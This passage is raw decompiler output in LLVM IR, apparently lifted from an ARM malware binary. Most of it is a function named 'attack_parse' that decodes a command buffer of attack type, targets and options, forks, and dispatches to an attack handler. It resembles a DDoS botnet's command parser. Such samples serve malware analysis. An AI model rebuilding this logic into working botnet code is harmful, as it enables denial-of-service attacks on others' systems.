  %v0_82d0 = phi i32 [ 0, %dec_label_pc_82d0.preheader ], [ %v1_82d0, %dec_label_pc_82c0 ]
  %v0_82c8 = add i32 %v0_82c8.in, 8
  %v1_82d0 = add i32 %v0_82d0, 1
  %v9_82d4 = icmp eq i32 %v1_82d0, %arg1
  store i32 %v0_82c8, i32* %r1.global-to-local, align 4
  br i1 %v9_82d4, label %dec_label_pc_82e0, label %dec_label_pc_82c0

dec_label_pc_82e0:                                ; preds = %dec_label_pc_82d0, %dec_label_pc_82ec, %entry, %dec_label_pc_82f8
  %v2_82e4 = phi i32 [ %v3_829c, %dec_label_pc_82ec ], [ %v3_829c, %entry ], [ %v2_82e4.pre, %dec_label_pc_82f8 ], [ %v3_829c, %dec_label_pc_82d0 ]
  %v0_82e0 = phi i32 [ %arg4, %dec_label_pc_82ec ], [ %arg4, %entry ], [ %v3_82fc, %dec_label_pc_82f8 ], [ %arg4, %dec_label_pc_82d0 ]
  store i32 %v2_82e4, i32* @r4, align 4
  store i32 %v6_829c, i32* @lr, align 4
  ret i32 %v0_82e0

dec_label_pc_82ec:                                ; preds = %dec_label_pc_82c0, %dec_label_pc_82a8
  %v0_82ec = phi i32 [ %v0_82a8, %dec_label_pc_82a8 ], [ %v0_82c8, %dec_label_pc_82c0 ]
  %v1_82ec = inttoptr i32 %v0_82ec to i32*
  %v2_82ec = load i32, i32* %v1_82ec, align 4
  %v2_82f0 = icmp eq i32 %v2_82ec, 0
  br i1 %v2_82f0, label %dec_label_pc_82e0, label %dec_label_pc_82f8

dec_label_pc_82f8:                                ; preds = %dec_label_pc_82ec
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_82fc = inttoptr i32 %v2_82ec to i8*
  %v3_82fc = call i32 @util_atoi(i8* %v2_82fc, i32 10)
  %v2_82e4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_82e0

; uselistorder directives
  uselistorder i32 %v1_82d0, { 1, 0 }
  uselistorder i32 %v0_82c8, { 1, 0, 2 }
  uselistorder i32 %v0_82c8.in, { 1, 0 }
  uselistorder i32 %v0_82a8, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_82e0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_82d0, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_8308 = load i32, i32* @r5, align 4
  %v9_8308 = load i32, i32* @r6, align 4
  %v12_8308 = load i32, i32* @r7, align 4
  %v18_8308 = load i32, i32* @sb, align 4
  %v21_8308 = load i32, i32* @sl, align 4
  %v24_8308 = load i32, i32* @fp, align 4
  %v2_830c = icmp ugt i32 %arg2, 2
  %v7_830c = icmp eq i32 %arg2, 3
  store i1 %v7_830c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_8318 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8318, i32* @r5, align 4
  %v2_831c = xor i1 %v7_830c, true
  %v3_831c = and i1 %v2_830c, %v2_831c
  br i1 %v3_831c, label %dec_label_pc_832c, label %dec_label_pc_8320

dec_label_pc_8320:                                ; preds = %dec_label_pc_8370, %.dec_label_pc_8320_crit_edge, %dec_label_pc_8364, %dec_label_pc_8354, %dec_label_pc_832c, %entry, %dec_label_pc_8518
  %v1_8328 = phi i32 [ %v1_8328.pre, %.dec_label_pc_8320_crit_edge ], [ %v1_8330, %dec_label_pc_8370 ], [ %v1_8330, %dec_label_pc_8364 ], [ %v1_8330, %dec_label_pc_8354 ], [ %v1_8330, %dec_label_pc_832c ], [ %v0_8318, %entry ], [ %v0_851c, %dec_label_pc_8518 ]
  store i32 %v6_8308, i32* @r5, align 4
  store i32 %v9_8308, i32* @r6, align 4
  store i32 %v12_8308, i32* @r7, align 4
  store i32 %v18_8308, i32* @sb, align 4
  store i32 %v21_8308, i32* @sl, align 4
  store i32 %v24_8308, i32* @fp, align 4
  ret i32 %v1_8328

dec_label_pc_832c:                                ; preds = %entry
  %v1_832c = inttoptr i32 %v0_8318 to i32*
  %v2_832c = load i32, i32* %v1_832c, align 4
  %v1_8330 = and i32 %v2_832c, 16711680
  store i32 %v1_8330, i32* %r0.global-to-local, align 4
  %v3_8334 = udiv i32 %v2_832c, 16777216
  %v1_8338 = and i32 %v2_832c, ptrtoint (i32* @global_var_ff00.28 to i32)
  %v4_833c = udiv i32 %v1_8330, 256
  %v5_833c = or i32 %v4_833c, %v3_8334
  %v4_8340 = mul i32 %v1_8338, 256
  %v5_8340 = or i32 %v5_833c, %v4_8340
  store i32 %v5_8340, i32* %r3.global-to-local, align 4
  %v4_8344 = mul i32 %v2_832c, 16777216
  %v5_8344 = or i32 %v5_8340, %v4_8344
  store i32 %v5_8344, i32* %r1.global-to-local, align 4
  %v7_8348 = icmp eq i32 %arg2, 4
  store i1 %v7_8348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8348, label %dec_label_pc_8320, label %dec_label_pc_8354

dec_label_pc_8354:                                ; preds = %dec_label_pc_832c
  %v1_8354 = add i32 %v0_8318, 4
  %v2_8354 = inttoptr i32 %v1_8354 to i8*
  %v3_8354 = load i8, i8* %v2_8354, align 1
  %v4_8354 = zext i8 %v3_8354 to i32
  store i32 %v4_8354, i32* %r3.global-to-local, align 4
  %v7_8358 = icmp eq i32 %arg2, 5
  store i1 %v7_8358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8358, label %dec_label_pc_8320, label %dec_label_pc_8364

dec_label_pc_8364:                                ; preds = %dec_label_pc_8354
  %v1_8364 = add i32 %v0_8318, 5
  %v2_8364 = inttoptr i32 %v1_8364 to i8*
  %v3_8364 = load i8, i8* %v2_8364, align 1
  %v4_8364 = zext i8 %v3_8364 to i32
  store i32 %v4_8364, i32* @sb, align 4
  %v2_8368 = icmp eq i8 %v3_8364, 0
  store i1 %v2_8368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8368, label %dec_label_pc_8320, label %dec_label_pc_8370

dec_label_pc_8370:                                ; preds = %dec_label_pc_8364
  %v2_8374 = mul nuw nsw i32 %v4_8364, 5
  store i32 %v2_8374, i32* @r7, align 4
  %v1_8378 = add i32 %arg2, -6
  store i32 %v1_8378, i32* %r3.global-to-local, align 4
  %v3_837c = icmp ult i32 %v1_8378, %v2_8374
  %v9_837c = icmp eq i32 %v1_8378, %v2_8374
  store i1 %v9_837c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_837c, label %dec_label_pc_8320, label %dec_label_pc_8384

dec_label_pc_8384:                                ; preds = %dec_label_pc_8370
  store i32 %v4_8364, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8378, i32* @r6, align 4
  %v2_8390 = call i32 @calloc(i32 %v4_8364, i32 24)
  store i32 %v2_8390, i32* %ip.global-to-local, align 4
  %v0_839c = load i32, i32* @r7, align 4
  %v1_839c = load i32, i32* @r4, align 4
  %v2_839c = sub i32 %v1_839c, %v0_839c
  store i32 %v2_839c, i32* @r7, align 4
  %v0_83a0 = load i32, i32* @r5, align 4
  %v1_83a0 = add i32 %v0_83a0, 11
  store i32 %v1_83a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_83a4

dec_label_pc_83a4:                                ; preds = %dec_label_pc_83a4, %dec_label_pc_8384
  %v1_83a8 = phi i32 [ %v1_83d4, %dec_label_pc_83a4 ], [ %v2_8390, %dec_label_pc_8384 ]
  %v0_83a4 = phi i32 [ %v1_83d0, %dec_label_pc_83a4 ], [ %v1_83a0, %dec_label_pc_8384 ]
  %v1_83a4 = add i32 %v0_83a4, -5
  %v2_83a4 = inttoptr i32 %v1_83a4 to i32*
  %v3_83a4 = load i32, i32* %v2_83a4, align 4
  store i32 %v3_83a4, i32* %r1.global-to-local, align 4
  %v2_83a8 = add i32 %v1_83a8, 16
  %v3_83a8 = inttoptr i32 %v2_83a8 to i32*
  store i32 %v3_83a4, i32* %v3_83a8, align 4
  %v0_83ac = load i32, i32* @r6, align 4
  %v1_83ac = add i32 %v0_83ac, -5
  store i32 %v1_83ac, i32* @r6, align 4
  %v0_83b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_83b0 = add i32 %v0_83b0, -1
  %v2_83b0 = inttoptr i32 %v1_83b0 to i8*
  %v3_83b0 = load i8, i8* %v2_83b0, align 1
  %v0_83b4 = load i32, i32* @r7, align 4
  %v1_83b4 = add i32 %v0_83b4, -6
  store i32 %v1_83b4, i32* %r3.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  %v9_83bc = icmp eq i32 %v1_83ac, %v1_83b4
  store i1 %v9_83bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_83b0, i32* @r4, align 4
  %v2_83c4 = load i32, i32* %ip.global-to-local, align 4
  %v3_83c4 = add i32 %v2_83c4, 20
  %v4_83c4 = inttoptr i32 %v3_83c4 to i8*
  store i8 %v3_83b0, i8* %v4_83c4, align 1
  %v0_83c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_83c8 = load i32, i32* %ip.global-to-local, align 4
  %v2_83c8 = add i32 %v1_83c8, 4
  %v3_83c8 = inttoptr i32 %v2_83c8 to i32*
  store i32 %v0_83c8, i32* %v3_83c8, align 4
  %v0_83cc = load i32, i32* @lr, align 4
  %v1_83cc = trunc i32 %v0_83cc to i16
  %v2_83cc = load i32, i32* %ip.global-to-local, align 4
  %v3_83cc = inttoptr i32 %v2_83cc to i16*
  store i16 %v1_83cc, i16* %v3_83cc, align 2
  %v0_83d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_83d0 = add i32 %v0_83d0, 5
  store i32 %v1_83d0, i32* %r0.global-to-local, align 4
  %v0_83d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_83d4 = add i32 %v0_83d4, 24
  store i32 %v1_83d4, i32* %ip.global-to-local, align 4
  %v0_83d8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83d8, label %dec_label_pc_83dc, label %dec_label_pc_83a4

dec_label_pc_83dc:                                ; preds = %dec_label_pc_83a4
  %v0_83dc = load i32, i32* @r6, align 4
  %v2_83dc = icmp eq i32 %v0_83dc, 0
  store i1 %v2_83dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83dc, label %dec_label_pc_84dc, label %dec_label_pc_83e4

dec_label_pc_83e4:                                ; preds = %dec_label_pc_83dc
  %v0_83e4 = load i32, i32* @r4, align 4
  %v1_83e4 = inttoptr i32 %v0_83e4 to i8*
  %v2_83e4 = load i8, i8* %v1_83e4, align 1
  %v3_83e4 = zext i8 %v2_83e4 to i32
  store i32 %v3_83e4, i32* @r5, align 4
  %v2_83e8 = icmp eq i8 %v2_83e4, 0
  store i1 %v2_83e8, i1* %cpsr_z.global-to-local, align 1
  %v0_83ec = load i32, i32* @r7, align 4
  %v1_83ec = add i32 %v0_83ec, -7
  store i32 %v1_83ec, i32* @r8, align 4
  br i1 %v2_83e8, label %bb, label %dec_label_pc_83f8

bb:                                               ; preds = %dec_label_pc_83e4
  store i32 %v3_83e4, i32* @r6, align 4
  br label %dec_label_pc_84ac

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83e4
  store i32 %v3_83e4, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_8400 = call i32 @calloc(i32 %v3_83e4, i32 8)
  store i32 %v2_8400, i32* %r0.global-to-local, align 4
  %v0_8404 = load i32, i32* @r8, align 4
  %v2_8404 = icmp eq i32 %v0_8404, 0
  store i1 %v2_8404, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8400, i32* @r6, align 4
  br i1 %v2_8404, label %dec_label_pc_84dc, label %dec_label_pc_8410

dec_label_pc_8410:                                ; preds = %dec_label_pc_83f8
  %v0_8410 = load i32, i32* @r4, align 4
  %v1_8410 = add i32 %v0_8410, 1
  %v2_8410 = inttoptr i32 %v1_8410 to i8*
  %v3_8410 = load i8, i8* %v2_8410, align 1
  %v0_8414 = load i32, i32* @r7, align 4
  %v7_8414 = icmp eq i32 %v0_8414, 8
  store i1 %v7_8414, i1* %cpsr_z.global-to-local, align 1
  %v3_8418 = add i32 %v2_8400, 4
  %v4_8418 = inttoptr i32 %v3_8418 to i8*
  store i8 %v3_8410, i8* %v4_8418, align 1
  %v0_841c = load i32, i32* @r4, align 4
  %v1_841c = add i32 %v0_841c, 1
  store i32 %v1_841c, i32* %r3.global-to-local, align 4
  %v0_8420 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8420, label %dec_label_pc_84dc, label %dec_label_pc_8424

dec_label_pc_8424:                                ; preds = %dec_label_pc_8410
  %v1_8424 = add i32 %v0_841c, 2
  %v2_8424 = inttoptr i32 %v1_8424 to i8*
  %v3_8424 = load i8, i8* %v2_8424, align 1
  %v4_8424 = zext i8 %v3_8424 to i32
  store i32 %v4_8424, i32* @r4, align 4
  %v0_8428 = load i32, i32* @r7, align 4
  %v1_8428 = add i32 %v0_8428, -9
  store i32 %v1_8428, i32* @r7, align 4
  %v9_842c = icmp eq i32 %v1_8428, %v4_8424
  store i1 %v9_842c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8424, i32* %r1.global-to-local, align 4
  %v5_8434 = icmp slt i32 %v1_8428, %v4_8424
  br i1 %v5_8434, label %dec_label_pc_84dc, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_8424
  %v7_84344711 = add i32 %v0_841c, 3
  store i32 %v7_84344711, i32* @r8, align 4
  %v6_8438812 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8438812, i32* @sl, align 4
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_8484

dec_label_pc_8448:                                ; preds = %dec_label_pc_8484
  %v0_8448 = load i32, i32* @r7, align 4
  %v1_8448 = load i32, i32* @r4, align 4
  %v2_8448 = sub i32 %v0_8448, %v1_8448
  store i32 %v2_8448, i32* %r1.global-to-local, align 4
  %v9_8448 = icmp eq i32 %v0_8448, %v1_8448
  store i1 %v9_8448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8448, label %dec_label_pc_84dc, label %dec_label_pc_8450

dec_label_pc_8450:                                ; preds = %dec_label_pc_8448
  %v3_8450 = mul i32 %v0_84a4, 8
  store i32 %v3_8450, i32* %r3.global-to-local, align 4
  %v1_8454 = load i32, i32* @r8, align 4
  %v2_8454 = add i32 %v1_8454, %v1_8448
  %v3_8454 = inttoptr i32 %v2_8454 to i8*
  %v4_8454 = load i8, i8* %v3_8454, align 1
  %v0_8458 = load i32, i32* @r6, align 4
  %v2_8458 = add i32 %v0_8458, %v3_8450
  store i32 %v2_8458, i32* @sl, align 4
  %v1_845c = add i32 %v2_8448, -1
  store i32 %v1_845c, i32* %r3.global-to-local, align 4
  %v7_845c = icmp eq i32 %v2_8448, 1
  store i1 %v7_845c, i1* %cpsr_z.global-to-local, align 1
  %v3_8460 = add i32 %v2_8458, 4
  %v4_8460 = inttoptr i32 %v3_8460 to i8*
  store i8 %v4_8454, i8* %v4_8460, align 1
  %v0_8464 = load i32, i32* @r4, align 4
  %v1_8464 = load i32, i32* @r8, align 4
  %v2_8464 = add i32 %v1_8464, %v0_8464
  store i32 %v2_8464, i32* %r1.global-to-local, align 4
  %v0_8468 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8468, label %dec_label_pc_84dc, label %dec_label_pc_846c

dec_label_pc_846c:                                ; preds = %dec_label_pc_8450
  %v1_846c = add i32 %v2_8464, 1
  %v2_846c = inttoptr i32 %v1_846c to i8*
  %v3_846c = load i8, i8* %v2_846c, align 1
  %v4_846c = zext i8 %v3_846c to i32
  store i32 %v4_846c, i32* @r4, align 4
  %v0_8470 = load i32, i32* %r3.global-to-local, align 4
  %v1_8470 = add i32 %v0_8470, -1
  store i32 %v1_8470, i32* @r7, align 4
  %v2_8474 = sub i32 %v1_8470, %v4_846c
  %tmp47 = sub i32 0, %v2_8474
  %v6_8474 = and i32 %v1_8470, %tmp47
  %v7_8474 = icmp slt i32 %v6_8474, 0
  %v8_8474 = icmp slt i32 %v2_8474, 0
  %v9_8474 = icmp eq i32 %v1_8470, %v4_846c
  store i1 %v9_8474, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_846c, i32* %r1.global-to-local, align 4
  %v2_847c = xor i1 %v8_8474, %v7_8474
  br i1 %v2_847c, label %dec_label_pc_84dc, label %dec_label_pc_8480

dec_label_pc_8480:                                ; preds = %dec_label_pc_846c
  %v1_8480 = add i32 %v2_8464, 2
  store i32 %v1_8480, i32* @r8, align 4
  br label %dec_label_pc_8484

dec_label_pc_8484:                                ; preds = %.thread10, %dec_label_pc_8480
  %v0_8488 = phi i32 [ %v4_8424, %.thread10 ], [ %v4_846c, %dec_label_pc_8480 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_8488 = add nuw nsw i32 %v0_8488, 1
  store i32 %v2_8488, i32* %r0.global-to-local, align 4
  %v2_848c = call i32 @calloc(i32 %v2_8488, i32 1)
  store i32 %v2_848c, i32* %r0.global-to-local, align 4
  %v0_8490 = load i32, i32* @fp, align 4
  %v1_8490 = add i32 %v0_8490, 1
  store i32 %v1_8490, i32* @fp, align 4
  %v1_8494 = load i32, i32* @sl, align 4
  %v2_8494 = inttoptr i32 %v1_8494 to i32*
  store i32 %v2_848c, i32* %v2_8494, align 4
  %v0_8498 = load i32, i32* @r8, align 4
  store i32 %v0_8498, i32* %r1.global-to-local, align 4
  %v0_849c = load i32, i32* @r4, align 4
  %v3_84a0 = call i32 @util_memcpy(i32 %v2_848c, i32 %v0_8498, i32 %v0_849c)
  store i32 %v3_84a0, i32* %r0.global-to-local, align 4
  %v0_84a4 = load i32, i32* @fp, align 4
  %v1_84a4 = load i32, i32* @r5, align 4
  %v9_84a4 = icmp eq i32 %v0_84a4, %v1_84a4
  store i1 %v9_84a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_84a4, label %dec_label_pc_84ac, label %dec_label_pc_8448

dec_label_pc_84ac:                                ; preds = %dec_label_pc_8484, %bb
  %v0_84ac = call i32 @__GI___errno_location()
  store i32 %v0_84ac, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_84b4 = inttoptr i32 %v0_84ac to i32*
  store i32 0, i32* %v2_84b4, align 4
  %v0_84b8 = call i32 @__libc_fork()
  store i32 %v0_84b8, i32* %r0.global-to-local, align 4
  %v7_84bc = icmp eq i32 %v0_84b8, -1
  %. = zext i1 %v7_84bc to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_84c8 = icmp eq i32 %v0_84b8, 0
  store i1 %v2_84c8, i1* %cpsr_z.global-to-local, align 1
  %tmp50 = icmp slt i32 %v0_84b8, 1
  br i1 %tmp50, label %bb51, label %.thread14

.thread14:                                        ; preds = %dec_label_pc_84ac
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_84dc

bb51:                                             ; preds = %dec_label_pc_84ac
  %v2_84d4 = icmp eq i1 %v7_84bc, false
  store i1 %v2_84d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84d4, label %dec_label_pc_8524, label %dec_label_pc_84dc

dec_label_pc_84dc:                                ; preds = %dec_label_pc_8448, %dec_label_pc_846c, %dec_label_pc_8450, %dec_label_pc_8424, %.thread14, %dec_label_pc_8410, %dec_label_pc_83f8, %dec_label_pc_83dc, %bb51
  store i32 %v2_8390, i32* %r3.global-to-local, align 4
  %v2_84e0 = icmp eq i32 %v2_8390, 0
  store i1 %v2_84e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84e0, label %bb53, label %bb52

bb52:                                             ; preds = %dec_label_pc_84dc
  store i32 %v2_8390, i32* %r0.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %dec_label_pc_84dc, %bb52
  store i32 34028, i32* @lr, align 4
  %v1_84e8 = xor i1 %v2_84e0, true
  call void @__pseudo_cond_branch(i1 %v1_84e8, i32 ptrtoint (i32* @global_var_11adc.29 to i32))
  %v0_84ec = load i32, i32* @r6, align 4
  %v2_84ec = icmp eq i32 %v0_84ec, 0
  store i1 %v2_84ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84ec, label %.dec_label_pc_8320_crit_edge, label %dec_label_pc_84f4

.dec_label_pc_8320_crit_edge:                     ; preds = %bb53
  %v1_8328.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8320

dec_label_pc_84f4:                                ; preds = %bb53
  %v0_84f4 = load i32, i32* @r5, align 4
  %v2_84f4 = icmp eq i32 %v0_84f4, 0
  store i1 %v2_84f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84f4, label %dec_label_pc_8518, label %dec_label_pc_84fc

dec_label_pc_84fc:                                ; preds = %dec_label_pc_84f4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_8500

dec_label_pc_8500:                                ; preds = %dec_label_pc_8500, %dec_label_pc_84fc
  %v1_8500 = phi i32 [ 0, %dec_label_pc_84fc ], [ %v1_850c, %dec_label_pc_8500 ]
  %v0_8500 = phi i32 [ %v0_84ec, %dec_label_pc_84fc ], [ %v0_8518.pre, %dec_label_pc_8500 ]
  %v4_8500 = mul i32 %v1_8500, 8
  %v5_8500 = add i32 %v4_8500, %v0_8500
  %v6_8500 = inttoptr i32 %v5_8500 to i32*
  %v7_8500 = load i32, i32* %v6_8500, align 4
  store i32 %v7_8500, i32* %r0.global-to-local, align 4
  %v2_8504 = icmp eq i32 %v7_8500, 0
  store i1 %v2_8504, i1* %cpsr_z.global-to-local, align 1
  store i32 34060, i32* @lr, align 4
  %v1_8508 = xor i1 %v2_8504, true
  call void @__pseudo_cond_branch(i1 %v1_8508, i32 ptrtoint (i32* @global_var_11adc.29 to i32))
  %v0_850c = load i32, i32* @r4, align 4
  %v1_850c = add i32 %v0_850c, 1
  store i32 %v1_850c, i32* @r4, align 4
  %v0_8510 = load i32, i32* @r5, align 4
  %v9_8510 = icmp eq i32 %v0_8510, %v1_850c
  store i1 %v9_8510, i1* %cpsr_z.global-to-local, align 1
  %v0_8518.pre = load i32, i32* @r6, align 4
  br i1 %v9_8510, label %dec_label_pc_8518, label %dec_label_pc_8500

dec_label_pc_8518:                                ; preds = %dec_label_pc_8500, %dec_label_pc_84f4
  %v0_8518 = phi i32 [ %v0_84ec, %dec_label_pc_84f4 ], [ %v0_8518.pre, %dec_label_pc_8500 ]
  store i32 %v0_8518, i32* @r0, align 4
  %v0_851c = call i32 @free()
  store i32 %v0_851c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8320

dec_label_pc_8524:                                ; preds = %bb51
  store i32 ptrtoint (i8** @global_var_20f30.31 to i32), i32* %r3.global-to-local, align 4
  %v2_8528 = load i8, i8* bitcast (i8** @global_var_20f30.31 to i8*), align 4
  %v3_8528 = zext i8 %v2_8528 to i32
  store i32 %v3_8528, i32* %r0.global-to-local, align 4
  %v2_852c = icmp eq i8 %v2_8528, 0
  store i1 %v2_852c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_852c, label %dec_label_pc_8590, label %dec_label_pc_8534

dec_label_pc_8534:                                ; preds = %dec_label_pc_8524
  store i32 ptrtoint (i32* @global_var_20f34.33 to i32), i32* %r3.global-to-local, align 4
  %v2_8538 = load i32, i32* @global_var_20f34.33, align 4
  store i32 %v2_8538, i32* %r1.global-to-local, align 4
  %v1_853c = inttoptr i32 %v2_8538 to i32*
  %v2_853c = load i32, i32* %v1_853c, align 4
  store i32 %v2_853c, i32* %ip.global-to-local, align 4
  %v1_8544 = add i32 %v2_853c, 4
  %v2_8544 = inttoptr i32 %v1_8544 to i8*
  %v3_8544 = load i8, i8* %v2_8544, align 1
  %v4_8544 = zext i8 %v3_8544 to i32
  store i32 %v4_8544, i32* %r3.global-to-local, align 4
  %v9_8548 = icmp eq i8 %v3_8544, %v3_8354
  store i1 %v9_8548, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8548, label %dec_label_pc_8570, label %dec_label_pc_8550

dec_label_pc_8550:                                ; preds = %dec_label_pc_8534, %dec_label_pc_855c
  %v0_8550 = phi i32 [ %v1_8550, %dec_label_pc_855c ], [ 0, %dec_label_pc_8534 ]
  %v1_8550 = add i32 %v0_8550, 1
  %v9_8554 = icmp eq i32 %v1_8550, %v3_8528
  store i1 %v9_8554, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8554, label %dec_label_pc_8590, label %dec_label_pc_855c

dec_label_pc_855c:                                ; preds = %dec_label_pc_8550
  %v4_855c = mul i32 %v1_8550, 4
  %v5_855c = add i32 %v4_855c, %v2_8538
  %v6_855c = inttoptr i32 %v5_855c to i32*
  %v7_855c = load i32, i32* %v6_855c, align 4
  store i32 %v7_855c, i32* %ip.global-to-local, align 4
  %v1_8564 = add i32 %v7_855c, 4
  %v2_8564 = inttoptr i32 %v1_8564 to i8*
  %v3_8564 = load i8, i8* %v2_8564, align 1
  %v4_8564 = zext i8 %v3_8564 to i32
  store i32 %v4_8564, i32* %r3.global-to-local, align 4
  %v9_8568 = icmp eq i8 %v3_8564, %v3_8354
  store i1 %v9_8568, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8568, label %dec_label_pc_8570, label %dec_label_pc_8550

dec_label_pc_8570:                                ; preds = %dec_label_pc_855c, %dec_label_pc_8534
  %v0_8584 = phi i32 [ %v2_853c, %dec_label_pc_8534 ], [ %v7_855c, %dec_label_pc_855c ]
  store i32 %v5_8344, i32* %r0.global-to-local, align 4
  %v0_8578 = load i32, i32* @sb, align 4
  store i32 %v0_8578, i32* %r1.global-to-local, align 4
  %v0_8580 = load i32, i32* @r5, align 4
  store i32 %v0_8580, i32* %r3.global-to-local, align 4
  %v1_8584 = inttoptr i32 %v0_8584 to i32*
  %v2_8584 = load i32, i32* %v1_8584, align 4
  store i32 %v2_8584, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_8584)
  br label %dec_label_pc_8590

dec_label_pc_8590:                                ; preds = %dec_label_pc_8550, %dec_label_pc_8524, %dec_label_pc_8570
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_8594 = call i32 @__GI_exit(i32 0)
  store i32 %v1_8594, i32* %r0.global-to-local, align 4
  %v0_8598 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8598, label %bb55, label %.thread17

bb55:                                             ; preds = %dec_label_pc_8590
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %dec_label_pc_8590, %bb55
  %v3_859c = phi i32 [ %v1_8594, %dec_label_pc_8590 ], [ 0, %bb55 ]
  ret i32 %v3_859c

; uselistorder directives
  uselistorder i1 %v9_8568, { 1, 0 }
  uselistorder i32 %v1_8550, { 1, 2, 0 }
  uselistorder i1 %v9_8548, { 1, 0 }
  uselistorder i32 %v0_851c, { 1, 0 }
  uselistorder i32 %v1_850c, { 1, 2, 0 }
  uselistorder i1 %v2_84e0, { 0, 2, 1 }
  uselistorder i1 %v2_84d4, { 1, 0 }
  uselistorder i1 %v7_84bc, { 1, 0 }
  uselistorder i32 %v0_84b8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_84a4, { 1, 0 }
  uselistorder i32 %v2_8474, { 1, 0 }
  uselistorder i32 %v1_8470, { 2, 0, 1, 3 }
  uselistorder i32 %v4_846c, { 0, 2, 1, 3 }
  uselistorder i32 %v3_8450, { 1, 0 }
  uselistorder i32 %v3_83e4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83d4, { 1, 0 }
  uselistorder i32 %v1_83d0, { 1, 0 }
  uselistorder i32 %v2_8390, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v4_8364, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8330, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_832c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8318, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 6, 7, 8, 9, 10, 11, 0, 12, 13, 14, 15, 1, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 10, 11, 2, 3, 12, 13, 1, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 14, 18, 15, 16, 17, 21, 19, 22, 20, 23, 24, 2, 4, 3, 10, 11, 5, 6, 7, 8, 9, 12, 13, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 6, 7, 8, 0, 1, 2, 3, 4, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 19, 16, 17, 18, 20, 21, 22, 23, 24, 25, 26, 0, 27, 2, 28, 29, 30, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder label %.thread17, { 1, 0 }
  uselistorder label %dec_label_pc_8590, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8550, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_84dc, { 8, 4, 1, 2, 0, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_8484, { 1, 0 }
  uselistorder label %dec_label_pc_8320, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
